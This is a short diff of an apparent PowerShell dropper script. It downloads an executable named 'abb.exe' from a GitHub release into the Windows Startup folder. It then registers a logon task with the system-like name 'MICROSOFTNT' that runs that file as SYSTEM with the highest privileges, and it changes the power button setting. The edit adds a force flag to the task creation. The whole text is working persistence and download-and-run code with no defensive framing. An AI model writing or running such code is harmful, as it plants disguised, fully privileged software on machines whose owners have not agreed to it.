@@ -1,6 +1,6 @@
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Power" -Name "PowerButtonAction" -Value 0
 
-schtasks.exe /Create /SC ONLOGON /TN "MICROSOFTNT" /TR "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abb.exe" /RU SYSTEM /RL HIGHEST
+schtasks.exe /Create /SC ONLOGON /TN "MICROSOFTNT" /TR "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abb.exe" /RU SYSTEM /RL HIGHEST /F
 
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile("https://github.com/ZeRo1k/ngrok_server_clash/releases/download/%40private/abb.exe", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abb.exe")
